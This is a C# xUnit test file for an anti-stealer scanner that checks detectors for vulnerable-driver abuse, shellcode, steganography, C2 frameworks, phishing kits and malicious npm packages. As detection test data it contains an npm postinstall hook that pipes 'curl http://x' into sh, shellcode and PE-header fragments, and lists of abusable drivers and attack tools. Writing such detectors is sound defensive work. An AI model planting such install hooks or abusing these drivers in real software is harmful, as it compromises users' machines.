using System.Linq;
using AntiStealerOneExe;
using Xunit;

namespace AntiStealer.Tests
{
    public class AdvancedThreatDetectorsTests
    {
        private static AnalysisResult Make(string fileType, params string[] strings)
        {
            var r = new AnalysisResult("x") { FileType = fileType };
            r.StringHits.AddRange(strings);
            return r;
        }

        // 2.11 ---------------------------------------------------------------

        [Fact]
        public void Byovd_KnownDrivers_AreDetected()
        {
            var r = Make("PE32",
                "loads RTCore64.sys and gdrv.sys",
                "kernel exploit via mhyprot2.sys");
            var hits = ByovdDetector.Detect(r);
            Assert.Contains("byovd:driver:rtcore64.sys", hits);
            Assert.Contains("byovd:driver:gdrv.sys",     hits);
            Assert.Contains("byovd:driver:mhyprot2.sys", hits);
        }

        [Fact]
        public void Byovd_DriverLoadApis_AreDetected()
        {
            var r = Make("PE32",
                "NtLoadDriver invoked",
                "OpenSCManager + CreateServiceW",
                "SeLoadDriverPrivilege adjustment");
            var hits = ByovdDetector.Detect(r);
            Assert.Contains("byovd:api:NtLoadDriver",          hits);
            Assert.Contains("byovd:api:OpenSCManager",         hits);
            Assert.Contains("byovd:api:CreateService",         hits);
            Assert.Contains("byovd:api:SeLoadDriverPrivilege", hits);
        }

        [Fact]
        public void Byovd_AllKnownDriversCovered()
        {
            // Sanity check that the curated list isn't empty and contains
            // the expected canonical names.
            Assert.Contains("dbutil_2_3.sys", ByovdDetector.VulnerableDrivers);
            Assert.Contains("winring0x64.sys", ByovdDetector.VulnerableDrivers);
        }

        // 2.12 ---------------------------------------------------------------

        [Fact]
        public void Shellcode_CsPrologueAndEggHunter_Detected()
        {
            var r = Make("PE32",
                "embedded hex blob: fce8820000006089e5...",
                "egg hunter sled 6681caff0f");
            var hits = ShellcodeDetector.Detect(r);
            Assert.Contains("shellcode:cs_x64_stager_prologue", hits);
            Assert.Contains("shellcode:msf_egg_hunter",         hits);
        }

        [Fact]
        public void Shellcode_ClassicRunnerTriplet_DetectedWhenAll3Present()
        {
            var r = Make("PE32",
                "VirtualAlloc",
                "VirtualProtect",
                "CreateThread");
            var hits = ShellcodeDetector.Detect(r);
            Assert.Contains("shellcode:classic_runner_triplet", hits);
        }

        [Fact]
        public void Shellcode_ClassicRunnerTriplet_NotPresentWithPartialSet()
        {
            var r = Make("PE32", "VirtualAlloc only");
            var hits = ShellcodeDetector.Detect(r);
            Assert.DoesNotContain("shellcode:classic_runner_triplet", hits);
        }

        // 2.13 ---------------------------------------------------------------

        [Fact]
        public void Stego_Base64PeHeader_Detected()
        {
            var r = Make("PNG",
                "Begin payload: TVqQAAMAAAAEAAAA////AAAA");
            var hits = StegoDetector.Detect(r);
            Assert.Contains("stego:base64_pe_header_TVqQAA", hits);
        }

        [Fact]
        public void Stego_ToolMarkers_Detected()
        {
            var r = Make("PNG",
                "uses steghide -ef secret",
                "lsbsteg embed",
                "openstego v0.7");
            var hits = StegoDetector.Detect(r);
            Assert.Contains("stego:tool_steghide",   hits);
            Assert.Contains("stego:tool_lsbsteg",    hits);
            Assert.Contains("stego:tool_openstego",  hits);
        }

        // 2.14 ---------------------------------------------------------------

        [Theory]
        [InlineData("cobaltstrike",  "c2:CobaltStrike")]
        [InlineData("beacon.x64.dll","c2:CobaltStrike:beacon_x64")]
        [InlineData("sliverpb",      "c2:Sliver:protobuf")]
        [InlineData("mythic_c2",     "c2:Mythic:c2_route")]
        [InlineData("apollo agent",  "c2:Mythic:apollo")]
        [InlineData("demon.x64.dll", "c2:Havoc:demon_x64")]
        [InlineData("brute ratel",   "c2:BruteRatel")]
        [InlineData("badger.dll",    "c2:BruteRatel:badger_dll")]
        public void C2Framework_Markers_Detected(string marker, string expectedTag)
        {
            var r = Make("PE32", marker + " init");
            var hits = C2FrameworkDetector.Detect(r);
            Assert.Contains(expectedTag, hits);
        }

        [Fact]
        public void C2Framework_NoHits_OnCleanSample()
        {
            var r = Make("PE32", "completely normal binary");
            Assert.Empty(C2FrameworkDetector.Detect(r));
        }

        // 2.15 ---------------------------------------------------------------

        [Fact]
        public void Phishing_Evilginx_Gophish_TelegramExfil_Detected()
        {
            var r = Make("HTML",
                "<html lang=\"en\">",
                "evilginx2 config",
                "gophish landing page",
                "teleg_send($pwd,$victim_email)");
            var hits = PhishingKitDetector.Detect(r);
            Assert.Contains("phish:evilginx",              hits);
            Assert.Contains("phish:gophish",               hits);
            Assert.Contains("phish:telegram_exfil_fn",     hits);
            Assert.Contains("phish:victim_email_var",      hits);
        }

        [Fact]
        public void Phishing_BrandMarkers_DetectedInPhp()
        {
            var r = Make("PHP",
                "<?php",
                "Sign in to Microsoft 365",
                "antibot.php active",
                "captcha bypass module");
            var hits = PhishingKitDetector.Detect(r);
            Assert.Contains("phish:brand:microsoft365", hits);
            Assert.Contains("phish:antibot_filter",     hits);
            Assert.Contains("phish:captcha_bypass",     hits);
        }

        [Fact]
        public void Phishing_NoHits_OnPe()
        {
            var r = Make("PE32", "evilginx2"); // PE, no HTML/PHP/JS gate
            Assert.Empty(PhishingKitDetector.Detect(r));
        }

        // 2.16 ---------------------------------------------------------------

        [Fact]
        public void Npm_PostinstallAndChildProcess_Detected()
        {
            var r = Make("JSON",
                "package.json",
                "\"scripts\":",
                "\"postinstall\": \"node -e \\\"require('child_process').exec('curl http://x|sh')\\\"\"");
            var hits = NpmSupplyChainDetector.Detect(r);
            Assert.Contains("npm:postinstall_hook",        hits);
            Assert.Contains("npm:require_child_process",   hits);
            Assert.Contains("npm:exec_call",               hits);
            Assert.Contains("npm:install_curl",            hits);
        }

        [Fact]
        public void Npm_Typosquats_Detected()
        {
            var r = Make("JSON",
                "package.json",
                "\"dependencies\": { \"lodahs\": \"1.0.0\", \"expreess\": \"4.0.0\" }");
            var hits = NpmSupplyChainDetector.Detect(r);
            Assert.Contains("npm:typosquat:lodahs",   hits);
            Assert.Contains("npm:typosquat:expreess", hits);
        }

        [Fact]
        public void Npm_NoHits_OnElf()
        {
            var r = Make("ELF64", "lodahs string but no package.json"); // gate fails
            Assert.Empty(NpmSupplyChainDetector.Detect(r));
        }

        // Pipeline -----------------------------------------------------------

        [Fact]
        public void Pipeline_PopulatesAllBuckets()
        {
            var r = Make("PE32",
                "RTCore64.sys load",
                "fce8820000006089e5",
                "TVqQAAMAAAA",
                "cobaltstrike beacon",
                "<form action=\"login\"><html>",
                "evilginx2 cfg",
                "package.json",
                "\"postinstall\":");
            AdvancedThreatPipeline.RunOn(r);
            Assert.Contains("byovd:driver:rtcore64.sys",       r.ByovdIndicators);
            Assert.Contains("shellcode:cs_x64_stager_prologue",r.ShellcodeIndicators);
            Assert.Contains("stego:base64_pe_header_TVqQAA",   r.StegoIndicators);
            Assert.Contains("c2:CobaltStrike",                 r.C2FrameworkIndicators);
            Assert.Contains("phish:evilginx",                  r.PhishingKitIndicators);
            Assert.Contains("npm:postinstall_hook",            r.NpmSupplyChainIndicators);
        }

        [Fact]
        public void Pipeline_IsIdempotent()
        {
            var r = Make("PE32", "RTCore64.sys load");
            AdvancedThreatPipeline.RunOn(r);
            int after = r.ByovdIndicators.Count;
            AdvancedThreatPipeline.RunOn(r);
            Assert.Equal(after, r.ByovdIndicators.Count);
        }
    }
}
